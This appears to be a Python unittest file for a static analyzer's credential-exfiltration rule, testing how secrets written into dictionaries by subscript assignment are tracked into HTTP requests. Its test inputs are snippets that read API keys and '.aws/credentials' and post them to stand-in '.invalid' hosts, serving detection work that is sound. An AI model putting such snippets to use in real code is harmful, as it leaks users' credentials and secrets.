"""Incremental subscript writes must contribute to the container's provenance."""

import unittest
from test_qindun_certify import MODULE


class PythonSubscriptMutationTests(unittest.TestCase):
    def analyze(self, body):
        source = (
            'import os,requests\nkey=os.getenv("API_KEY")\nother=os.getenv("OTHER_SECRET")\n' + body
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        return {
            hit.disposition for hit in hits if hit.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
        }

    def test_incremental_payload_writes(self):
        cases = [
            'fields={"payload":""}\nfields["payload"]+=key\n',
            'fields={"payload":key}\nfields["payload"]+="public"\n',
            'fields={"payload":{}}\nfields["payload"]|={"dump":key}\n',
            'fields={"nested":{"payload":""}}\nfields["nested"]["payload"]+=key\n',
            'fields=[""]\nfields[0]+=key\n',
            'fields={"payload":""}\nalias=fields\nalias["payload"]+=key\n',
            'fields={"payload":""}\nfields["payload"]+=open(".aws/credentials").read()\n',
        ]
        for binding in cases:
            with self.subTest(binding=binding):
                self.assertEqual(
                    self.analyze(
                        binding + 'requests.post("https://service.invalid",json=fields)\n'
                    ),
                    {"confirmed"},
                )

    def test_header_purpose_is_not_inherited_by_nested_payload(self):
        for binding, expected in [
            ('fields={"X-API-Key":""}\nfields["X-API-Key"]+=key\n', {"candidate"}),
            (
                'fields={"nested":{"X-API-Key":""}}\nfields["nested"]["X-API-Key"]+=key\n',
                {"confirmed"},
            ),
            (
                'fields={"X-API-Key":""}\nfields["X-API-Key"]+=open(".aws/credentials").read()\n',
                {"confirmed"},
            ),
            ('fields={"X-API-Key":"","dump":other}\nfields["X-API-Key"]+=key\n', {"confirmed"}),
        ]:
            with self.subTest(binding=binding):
                self.assertEqual(
                    self.analyze(
                        binding + 'requests.get("https://service.invalid",headers=fields)\n'
                    ),
                    expected,
                )

    def test_public_increment_does_not_create_a_secret(self):
        self.assertEqual(
            self.analyze(
                'fields={"payload":"hello"}\nfields["payload"]+=" world"\nrequests.post("https://service.invalid",json=fields)\n'
            ),
            set(),
        )

    def test_unresolved_container_reports_partial_coverage(self):
        for operator in ("+=", "=", ":str="):
            with self.subTest(operator=operator):
                hits, error = MODULE._python_flow_findings(
                    "main.py",
                    f'import os\nobj.fields["payload"] {operator} os.getenv("API_KEY")\n',
                )
                self.assertIsNotNone(error)
                self.assertFalse(hits)

    def test_direct_and_annotated_nested_writes(self):
        for operator in ("=key", ":str=key"):
            for key_name, transport in (("payload", "json"), ("X-API-Key", "headers")):
                with self.subTest(operator=operator, key_name=key_name):
                    binding = f'fields={{"nested":{{"{key_name}":""}}}}\nfields["nested"]["{key_name}"]{operator}\n'
                    self.assertEqual(
                        self.analyze(
                            binding
                            + f'requests.post("https://service.invalid",{transport}=fields)\n'
                        ),
                        {"confirmed"},
                    )

    def test_direct_and_annotated_header_writes(self):
        for operator in ("=key", ":str=key"):
            with self.subTest(operator=operator):
                self.assertEqual(
                    self.analyze(
                        'fields={"X-API-Key":""}\n'
                        + f'fields["X-API-Key"]{operator}\n'
                        + 'requests.get("https://service.invalid",headers=fields)\n'
                    ),
                    {"candidate"},
                )

    def test_target_expression_side_effect_is_visited(self):
        self.assertEqual(
            self.analyze(
                'fields={"payload":""}\nfields[requests.post("https://other.invalid",data=key)] += "public"\n'
            ),
            {"confirmed"},
        )
